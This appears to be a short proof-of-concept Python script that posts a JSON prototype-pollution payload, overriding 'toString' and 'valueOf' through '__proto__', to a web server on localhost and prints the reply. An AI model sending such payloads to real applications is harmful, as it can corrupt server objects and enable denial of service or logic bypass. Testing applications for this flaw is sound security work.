import requests

url = 'http://localhost:80/'
headers = {"content-type": "application/json"}
exp_object = {
    "__proto__": {
        "toString": "123",
        "valueOf":"It works!",
        "jackfromeast":"0verF!owYourAAind"}
}

x = requests.post(url, json=exp_object, headers=headers)

print(x.text)